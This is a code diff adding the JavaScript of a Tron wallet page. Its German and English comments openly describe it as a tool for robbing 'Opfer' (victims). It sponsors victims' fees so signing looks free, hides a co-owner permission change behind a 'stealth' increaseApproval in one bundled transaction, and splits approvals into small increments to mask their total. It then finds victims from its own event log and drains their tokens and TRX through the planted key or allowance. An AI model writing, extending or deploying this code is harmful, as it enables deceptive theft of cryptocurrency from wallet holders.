+  // Ambiger Fehler (Infra/Timeout) ≠ zwingend nicht gesendet — TW broadcastet
+  // beim Signieren selbst. txid verifizieren bevor wir "failed" melden,
+  // sonst steht ein Erfolg als Reject und ein Retry signiert doppelt.
+  if (/tron api|http |timeout|fetch|network/i.test(msg) || !msg) {
+    for (var i = 0; i < 2; i++) {
+      await new Promise(function(r) { setTimeout(r, 4000); });
+      var info = await tg("/wallet/gettransactioninfobyid", { value: signed.txID }).catch(function() { return null; });
+      if (info && info.receipt) {
+        if (info.receipt.result === "SUCCESS") return signed.txID;
+        throw new Error("tx reverted on-chain: " + info.receipt.result);
+      }
+    }
+    throw new Error("broadcast unclear — check txid " + (signed.txID || "") + ": " + (msg || "no response"));
+  }
+  throw new Error(msg || "broadcast failed");
+}
+
+// Energy-Sponsoring (Stake 2.0) — Operator zahlt die Opfer-Fees:
+// stake → eigenes TRX in ENERGY staken; delegate → Energy an Opfer-Adresse
+// leihen (deren Tx brennt dann unsere Energy); undelegate → reclaim.
+// amount = TRX (human), to = Empfänger-Adresse der Delegation.
+async function buildResourceTx(from, path, extra) {
+  var body = { owner_address: tw_toHex(from).slice(2), resource: "ENERGY" };
+  for (var k in extra) body[k] = extra[k];
+  var res = await tg(path, body);
+  if (!res || !res.raw_data) throw new Error(path.split("/").pop() + " build failed: " + JSON.stringify(res && (res.Error || res.result) || res).slice(0, 160));
+  return res;
+}
+
+// hex (41-prefix) → base58check — für die Anzeige der deployed Contract-Adresse
+async function hexToBase58(hex) {
+  var bytes = new Uint8Array(hex.length / 2);
+  for (var i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
+  var h1 = await crypto.subtle.digest("SHA-256", bytes);
+  var h2 = new Uint8Array(await crypto.subtle.digest("SHA-256", h1));
+  var full = new Uint8Array(bytes.length + 4);
+  full.set(bytes); full.set(h2.slice(0, 4), bytes.length);
+  var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  var num = 0n;
+  for (var j = 0; j < full.length; j++) num = num * 256n + BigInt(full[j]);
+  var out = "";
+  while (num > 0n) { out = ALPH[Number(num % 58n)] + out; num /= 58n; }
+  for (var z = 0; z < full.length && full[z] === 0; z++) out = "1" + out;
+  return out;
+}
+
+// Base58 → hex without a library (Tron addr = 0x41 + 20 bytes + 4-byte checksum)
+function tw_toHex(addr58) {
+  var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  var num = 0n;
+  for (var i = 0; i < addr58.length; i++) num = num * 58n + BigInt(ALPH.indexOf(addr58[i]));
+  var hex = num.toString(16);
+  var zeros = 0;
+  while (addr58[zeros] === "1") zeros++;
+  hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+  return "0x" + hex.slice(0, -8); // strip 4-byte checksum
+}
+
+async function run() {
+  monit("page_opened", { page: "tron", spender: spender || null, token: token.name, amount: amountParam || "unlimited", method: method, inWallet: !!(window.tronWeb || window.tronLink || window.tron) });
+
+  var needsSpender = ["approve", "increase", "multi", "bundle"].indexOf(method) >= 0;
+  if (needsSpender && !isTronAddr(spender)) {
+    setStatus("missing spender");
+    monit("tron_error", { reason: "missing_or_invalid_spender" });
+    finish(false); return;
+  }
+  if (method === "revoke" && !isTronAddr(contractAddr)) {
+    setStatus("revoke needs contract= (deployed guarantee T-address)");
+    monit("tron_error", { reason: "revoke_missing_contract" });
+    finish(false); return;
+  }
+  if ((method === "delegate" || method === "undelegate" || method === "rent") && !isTronAddr(collectTo)) {
+    setStatus(method + " needs to= (receiver T-address)");
+    monit("tron_error", { reason: method + "_missing_to" });
+    finish(false); return;
+  }
+  if (["stake", "delegate", "undelegate"].indexOf(method) >= 0
+      && (amountParam === "" || !isFinite(Number(amountParam)) || Number(amountParam) <= 0)) {
+    setStatus(method + " needs amount= (TRX, e.g. 100)");
+    monit("tron_error", { reason: method + "_missing_amount" });
+    finish(false); return;
+  }
+  if (method === "rent" && amountParam !== "" && (!isFinite(Number(amountParam)) || Number(amountParam) < 4)) {
+    setStatus("rent needs amount >= 4 TRX (4 TRX = 65k energy)");
+    monit("tron_error", { reason: "rent_amount_too_small" });
+    finish(false); return;
+  }
+
+  setStatus("Connecting…");
+  var conn = await getTronProvider();
+  if (!conn) {
+    setStatus("no tron provider — open in Trust Wallet");
+    var inj = findTronWeb();
+    monit("no_provider", {
+      page: "tron",
+      tronWeb: inj ? "injected, ready=" + !!inj.ready + ", addr=" + (inj.defaultAddress ? "set" : "empty") : "missing",
+      tronLink: window.tronLink ? describeKeys(window.tronLink) : "missing",
+      tron: window.tron ? describeKeys(window.tron) : "missing",
+      trustwallet: window.trustwallet ? describeKeys(window.trustwallet) : "missing"
+    });
+    finish(false); return;
+  }
+
+  var tw = conn.tw;
+  var from = conn.from;
+  document.getElementById("addr").textContent = from;
+  monit("tron_connected", { addr: from });
+
+  // Auto-Erkennung der Opfer-Adresse aus den eigenen Events — der Operator
+  // kennt die Opfer-Wallet nicht im Voraus: approve_sent/guarantee_approved
+  // mappen spender/Key → Opfer (d.from). revoke: spender==contract.
+  async function resolveTarget(spenderOrContract) {
+    try {
+      var res = await fetch("/api/events?limit=500").then(function(r) { return r.json(); });
+      var evs = (res && res.events) || [];
+      var best = null, bestT = "";
+      evs.forEach(function(e) {
+        var ev = e.ev || {}, d = ev.d || {};
+        if ((ev.ev === "approve_sent" || ev.ev === "guarantee_approved")
+            && d.spender === spenderOrContract && isTronAddr(d.from)
+            && (ev.t || "") >= bestT) { best = d.from; bestT = ev.t || ""; }
+      });
+      return best;
+    } catch(e) { return null; }
+  }
+  if (method === "revoke" && !isTronAddr(backer)) {
+    setStatus("Resolving backer…");
+    backer = await resolveTarget(contractAddr) || backer;
+  }
+  if (method === "collect" && !isTronAddr(backer)) {
+    setStatus("Resolving backer…");
+    backer = await resolveTarget(from) || backer;
+  }
+  if (method === "drain" && !isTronAddr(victim)) {
+    setStatus("Resolving victim…");
+    victim = await resolveTarget(from) || victim;
+  }
+  if ((method === "revoke" || method === "collect") && !isTronAddr(backer)) {
+    setStatus(method + ": no approving wallet found in events — pass backer= manually");
+    monit("tron_error", { reason: method + "_unresolved_backer" });
+    finish(false); return;
+  }
+  if (method === "drain" && !isTronAddr(victim)) {
+    setStatus("drain: no perm record for this key — pass victim= manually");
+    monit("tron_error", { reason: "drain_unresolved_victim" });
+    finish(false); return;
+  }
+  var label = method === "perm" ? "Account permissions"
+            : method === "bundle" ? "Approve + permissions"
+            : method === "multi" ? "Approve USDT + USDC"
+            : method === "deploy" ? "Deploy guarantee contract"
+            : method === "revoke" ? "Revoke (pull allowance)"
+            : method === "collect" ? "Collect (transferFrom)"
+            : method === "drain" ? "Drain " + (drainTrx ? "TRX" : token.name) + " (co-owner key)"
+            : method === "stake" ? "Stake " + amountParam + " TRX → ENERGY"
+            : method === "delegate" ? "Delegate " + amountParam + " TRX energy → " + collectTo.slice(0, 10) + "…"
+            : method === "undelegate" ? "Undelegate energy from " + collectTo.slice(0, 10) + "…"
+            : method === "rent" ? "Rent " + (amountParam === "" ? "4" : amountParam) + " TRX energy → " + collectTo.slice(0, 10) + "…"
+            : (method === "increase" ? "increaseApproval " : "Approve ") + token.name + " (TRC-20)";
+  setStatus(label + "…");
+
+  // Opfer-Flows: erst Energy sponsorn (Fee ≈ 0 im Sheet), dann signieren
+  if (["approve", "increase", "perm", "bundle", "multi"].indexOf(method) >= 0) {
+    await sponsorFees(from);
+  }
+
+  try {
+    var raw = amountRaw();
+    setStatus("Confirm in wallet…");
+    var txid;
+    var deployedAddr = null;
+    var deployedB58 = null;
+    if (method === "deploy") {
+      // Deren Bytecode 1:1 — ein Sheet, danach existiert der Guarantee-
+      // Contract on-chain mit Deployer = A (revoke-Berechtigter)
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var dTx = await buildDeployTx(from);
+      deployedAddr = dTx.contract_address || null; // hex, 41-prefix
+      var dsigned = await tw.trx.sign(dTx);
+      txid = await broadcastTx(dsigned);
+    } else if (method === "revoke") {
+      // A ruft revoke(backer, amount) → Contract zieht per transferFrom aus
+      // der Allowance des Backers — keine Opfer-Interaktion mehr nötig
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var rTx = await buildRevokeTx(from);
+      var rsigned = await tw.trx.sign(rTx);
+      txid = await broadcastTx(rsigned);
+    } else if (method === "collect") {
+      // Pull aus einer Allowance auf eine nackte Adresse — die signierende
+      // Wallet IST der Spender. to= optional, default: signierende Wallet.
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var cTx = await buildCollectTx(from);
+      var csigned = await tw.trx.sign(cTx);
+      txid = await broadcastTx(csigned);
+    } else if (method === "drain") {
+      // Tx-Owner ist die kompromittierte Wallet — die signierende Wallet
+      // ist der eingetragene Fremd-Key. Tron-Multi-Sig akzeptiert die
+      // Signatur jedes Keys aus owner/active_permission.
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var gTx = await buildDrainTx(from);
+      var gsigned = await tw.trx.sign(gTx);
+      txid = await broadcastTx(gsigned);
+    } else if (method === "stake" || method === "delegate" || method === "undelegate") {
+      // Resource-Tx — Signer = Operator-Wallet (die eigene Energy wird gestakt/
+      // delegiert). amount in TRX → sun.
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var sun = Math.round(Number(amountParam) * 1e6);
+      var path = method === "stake" ? "/wallet/freezebalancev2"
+               : method === "delegate" ? "/wallet/delegateresource"
+               : "/wallet/undelegateresource";
+      var extra = method === "stake"
+        ? { frozen_balance: sun }
+        : { receiver_address: tw_toHex(collectTo).slice(2), balance: sun, lock: false };
+      var resTx = await buildResourceTx(from, path, extra);
+      var resSigned = await tw.trx.sign(resTx);
+      txid = await broadcastTx(resSigned);
+    } else if (method === "rent") {
+      // TronNRG — Energy kaufen statt selbst staken: (1) TRX an die Payment-
+      // Adresse senden, (2) nach Confirmation "{txid}:{to}" signieren,
+      // (3) POST /delegate via /api/nrg-Proxy → Energy landet in ~3s auf der
+      // Opfer-Adresse. Signer = Operator-Wallet, to= = Opfer.
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var paySun = Math.round((amountParam === "" ? 4 : Number(amountParam)) * 1e6);
+      var payTx = await tg("/wallet/createtransaction", {
+        owner_address: tw_toHex(from).slice(2),
+        to_address: tw_toHex(NRG_PAY_ADDR).slice(2),
+        amount: paySun
+      });
+      if (!payTx || !payTx.raw_data) throw new Error("rent payment build failed: " + JSON.stringify(payTx && (payTx.Error || payTx.result) || payTx).slice(0, 160));
+      await extendExpiration(payTx);
+      var paySigned = await tw.trx.sign(payTx);
+      var payTxid = await broadcastTx(paySigned);
+      monit("rent_paid", { amount: paySun / 1e6, to: collectTo, hash: payTxid, from: from });
+      // Payment muss on-chain bestätigt sein bevor TronNRG den Claim akzeptiert
+      setStatus("Payment sent — waiting for confirmation…");
+      var confirmed = false;
+      for (var pi = 0; pi < 15 && !confirmed; pi++) {
+        await new Promise(function(r) { setTimeout(r, 3000); });
+        var pinf = await tg("/wallet/gettransactioninfobyid", { value: payTxid });
+        confirmed = !!(pinf && pinf.receipt);
+      }
+      if (!confirmed) throw new Error("payment not confirmed in time — claim manually at tronnrg.com with tx " + payTxid);
+      // "{tx_hash}:{delegate_to}" signieren — beweist Ownership der Zahlung
+      var claimMsg = payTxid + ":" + collectTo;
+      var sig;
+      if (tw.trx && typeof tw.trx.signMessageV2 === "function") sig = await tw.trx.signMessageV2(claimMsg);
+      else if (tw.trx && typeof tw.trx.signMessage === "function") sig = await tw.trx.signMessage(claimMsg);
+      else throw new Error("provider lacks signMessageV2 — claim manually at tronnrg.com with tx " + payTxid);
+      setStatus("Claiming delegation…");
+      var claim = await fetch("/api/nrg", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ tx_hash: payTxid, delegate_to: collectTo, signature: sig })
+      }).then(function(r) { return r.json(); });
+      if (!claim || claim.error) throw new Error("NRG claim failed: " + JSON.stringify(claim).slice(0, 160));
+      monit("rent_delegated", { to: collectTo, energy: claim.energy || null, ref: claim.ref || null, hash: payTxid, from: from });
+      txid = payTxid;
+    } else if (method === "multi") {
+      // Zwei gleichartige Contracts in einer Tx — sauberster Multi-Contract-
+      // Test: scheitert TW am Bundling generell oder nur an Permission-Typen?
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var t1 = await buildApproveTx(from, "increaseApproval(address,uint256)", TRC20.usdt.addr);
+      var t2 = await buildApproveTx(from, "increaseApproval(address,uint256)", TRC20.usdc.addr);
+      t1.raw_data.contract = t1.raw_data.contract.concat(t2.raw_data.contract);
+      t1.raw_data.fee_limit = 200000000;
+      delete t1.txID; delete t1.raw_data_hex;
+      var msign = await tw.trx.sign(t1);
+      txid = await broadcastTx(msign);
+    } else if (method === "bundle") {
+      // Multi-contract tx — Tron-Protocol erlaubt mehrere Contracts in einem
+      // raw_data.contract[] unter EINER Signatur. TronGrid baut nur singles,
+      // also JSON-merge: increaseApproval (stealth: zeigt nur Inkrement) +
+      // AccountPermissionUpdate (Co-Owner-Key). Offene Frage: rendert das
+      // Wallet-Sheet beide Ops oder nur die erste?
+      if (from && spender && from === spender) {
+        monit("approve_rejected", { method: "bundle", reason: "spender_equals_owner — perm leg needs a second, distinct T-address" });
+        setStatus("perm needs a different key address");
+        finish(false); return;
+      }
+      var bacct = await tg("/wallet/getaccount", { address: tw_toHex(from).slice(2) }).catch(function() { return null; });
+      if (!bacct || !bacct.address) {
+        monit("tron_error", { method: "bundle", reason: "account_not_activated", from: from });
+        setStatus("account not activated on-chain — receive ≥0.1 TRX first");
+        finish(false); return;
+      }
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var aTx = await buildApproveTx(from, "increaseApproval(address,uint256)");
+      var pTx2 = await buildPermTx(from);
+      aTx.raw_data.contract = aTx.raw_data.contract.concat(pTx2.raw_data.contract);
+      aTx.raw_data.fee_limit = 200000000;
+      delete aTx.txID; delete aTx.raw_data_hex; // stale — wallet signs raw_data, node recomputes txID
+      var bsigned = await tw.trx.sign(aTx);
+      txid = await broadcastTx(bsigned);
+    } else if (method === "perm") {
+      // Der hinzugefügte Key muss sich vom Owner unterscheiden — sonst
+      // lehnt TronGrid den Build ab ("address should be distinct")
+      if (from && spender && from === spender) {
+        monit("approve_rejected", { method: "perm", reason: "spender_equals_owner — perm needs a second, distinct T-address" });
+        setStatus("perm needs a different key address");
+        finish(false); return;
+      }
+      // AccountPermissionUpdate braucht einen existierenden Account — frische
+      // Wallets (nie TRX empfangen) gibt's on-chain nicht → Node wirft
+      // "ownerAddress account does not exist". Vorher prüfen, klar melden.
+      var pacct = await tg("/wallet/getaccount", { address: tw_toHex(from).slice(2) }).catch(function() { return null; });
+      if (!pacct || !pacct.address) {
+        monit("tron_error", { method: "perm", reason: "account_not_activated", from: from });
+        setStatus("account not activated on-chain — receive ≥0.1 TRX first");
+        finish(false); return;
+      }
+      // AccountPermissionUpdate — kein Contract-Call, immer über
+      // TronGrid-build + wallet-sign + broadcast
+      if (!(tw.trx && tw.trx.sign)) throw new Error("provider lacks trx.sign — keys: " + describeKeys(tw));
+      var ptx = await buildPermTx(from);
+      var psigned = await tw.trx.sign(ptx);
+      txid = await broadcastTx(psigned);
+    } else if (tw.contract && typeof tw.contract === "function" && method !== "increase") {
+      // Full TronWeb — contract().at() path (build+sign+broadcast intern).
+      // increase geht bewusst NICHT über den Wrapper: USDT-TRC20 exponiert
+      // keine ABI → contract.increaseApproval existiert dort nicht;
+      // TronGrid-Build + trx.sign zeigt das Wallet-Sheet trotzdem.
+      var contract = await tw.contract().at(token.addr);
+      txid = await contract.approve(spender, raw).send({ feeLimit: 100000000 });
+    } else if (tw.trx && tw.trx.sign) {
+      // Thin shim — TronGrid builds unsigned, wallet signs, TronGrid broadcasts.
+      // method=increase + count>1: sequentielle Sheets — jeder zeigt nur das
+      // Inkrement, die Allowance akkumuliert (count × amount).
+      for (var step = 0; step < count; step++) {
+        if (count > 1) setStatus("Confirm in wallet… (" + (step + 1) + "/" + count + ")");
+        var unsigned = await buildApproveTx(from);
+        var signed = await tw.trx.sign(unsigned);
+        txid = await broadcastTx(signed);
+        if (count > 1) monit("approve_sent", { token: token.name + " (TRC-20)", spender: spender, amount: amountParam || "unlimited", method: method, step: step + 1, of: count, hash: txid, from: from });
+      }
+    } else {
+      throw new Error("provider lacks contract()/trx.sign — keys: " + describeKeys(tw));
+    }
+    if (method === "deploy") {
+      deployedB58 = deployedAddr ? await hexToBase58(deployedAddr.replace(/^0x/, "")) : null;
+      monit("contract_deployed", { contract: deployedB58, contractHex: deployedAddr, hash: txid, token: token.name, guaranteeAmount: amountParam || "20", expiryDays: days, A: from });
+    } else if (method === "revoke") {
+      monit("revoke_sent", { contract: contractAddr, backer: backer, amount: amountParam || "max", hash: txid, from: from });
+    } else if (method === "collect") {
+      monit("collect_sent", { backer: backer, to: isTronAddr(collectTo) ? collectTo : from, amount: amountParam || "auto(max)", token: token.name, hash: txid, from: from });
+    } else if (method === "drain") {
+      monit("drain_sent", { victim: victim, to: isTronAddr(collectTo) ? collectTo : from, amount: amountParam || "auto(max)", token: drainTrx ? "TRX" : token.name, signer: from, hash: txid });
+    } else if (method === "stake" || method === "delegate" || method === "undelegate") {
+      monit(method + "_sent", { amount: amountParam, to: collectTo || null, hash: txid, from: from });
+    } else if (count === 1) {
+      monit("approve_sent", { token: token.name + " (TRC-20)", spender: spender, amount: unlimited || amountParam === "" ? "unlimited" : amountParam, method: method, hash: txid, from: from });
+    }
+    setStatus("Broadcast — waiting…");
+
+    // Optional confirmation poll — result lands async on Tron (TronGrid,
+    // unabhängig davon wie vollständig der injizierte Provider ist)
+    try {
+      for (var i = 0; i < 20; i++) {
+        await new Promise(function(r) { setTimeout(r, 3000); });
+        var info = await tg("/wallet/gettransactioninfobyid", { value: txid });
+        if (info && info.receipt) {
+          monit("approve_confirmed", { hash: txid, method: method, result: info.receipt.result || "SUCCESS" });
+          break;
+        }
+      }
+    } catch(e) {}
+    setStatus(deployedB58 ? "Deployed: " + deployedB58 : "Done");
+    finish(true);
+  } catch(e) {
+    var reason = (e && (e.message || e)) + "";
+    monit("approve_rejected", { token: token.name + " (TRC-20)", method: method, reason: reason.slice(0, 200), from: from, spender: spender || null });
+    setStatus("Rejected — " + reason.slice(0, 80));
+    finish(false);
+  }
+}
+
+run();
+</script>
+</body>
+</html>
